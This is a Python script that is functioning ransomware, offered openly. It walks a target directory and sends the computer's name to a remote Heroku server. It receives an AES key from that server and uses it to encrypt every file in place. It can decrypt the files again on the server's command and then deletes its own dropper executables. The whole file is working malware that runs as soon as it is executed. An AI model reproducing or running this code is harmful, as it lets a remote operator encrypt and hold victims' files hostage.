
from pathlib import Path
from Crypto.Cipher import AES
import os
import requests
import signal



class VRBL:
    def __init__(self):
        with open('E:/New folders/hackfolder/config.bin','r') as f:
            self.path = f.read()
            # self.path +="\hackfolder"
            f.close()
        
        self.CPN = os.environ['COMPUTERNAME']
        self.flagList = {}
        self.getListFile()
        # self.HOST = 'localhost'
        # self.PORT = "3000"
        # self.LINK = "http://" + self.HOST + ":" + self.PORT
        self.LINK = "https://bleedingheart.herokuapp.com"

    def add2SWW(self):
        pass

    def getListFile(self):
        self.Listfiles = []
        for r, d, f in os.walk(self.path):
            for file in f:
                    self.Listfiles.append(os.path.join(r, file))


    def hack(self,key):
        print("Hacking...")
        # return
        key = bytes(key,'utf-8')
        for x in self.Listfiles:
            filename = x.split('\\')[-1]
            if filename == "movefile.exe":
                continue
            action = AES.new(key, mode=AES.MODE_EAX)
            data = None
            with open(x, 'rb') as f:
                data = f.read()
                f.close()
            result = action.encrypt(data)
            with open(x, 'wb') as f:
                f.write(action.nonce)
                f.write(result)
                f.close()
            self.flagList[x] = action.nonce

    def unhack(self,key):
        print("UnHacking...")
        # return 
        key = bytes(key,'utf-8')
        for x in self.Listfiles:
            filename = x.split('\\')[-1]
            if filename == "movefile.exe":
                continue
            data = None
            nonces = None
            with open(x, 'rb') as f:
                nonces = f.read(16)
                data = f.read()
                f.close()
            action = AES.new(key, mode=AES.MODE_EAX, nonce=nonces)
            with open(x, 'wb') as f:
                f.write(action.decrypt(data))
                f.close()

    def removeRoot(self):
        try:
            os.remove(self.path+"\\mylove.exe")
        except OSError as e:
            print()
        try:
            os.remove(self.path+"\\movefile.exe")
        except OSError as e:
            print()

    def getKey(self):
        try:
            req = requests.post(self.LINK+"/im-fish", {"name":self.CPN})
        except requests.ConnectionError as e:
            return
        response = req.json()
        print(response)
        if response["data"] == False:
            self.hack(response["key"])
        elif response["data"] == True:
            return
        else:
            self.unhack(response["key"])
        self.removeRoot()

    def printListF(self):
        for x in self.Listfiles:
            print(x)

    def printListNone(self):
        print(self.flagList)


t = VRBL()
t.getKey()
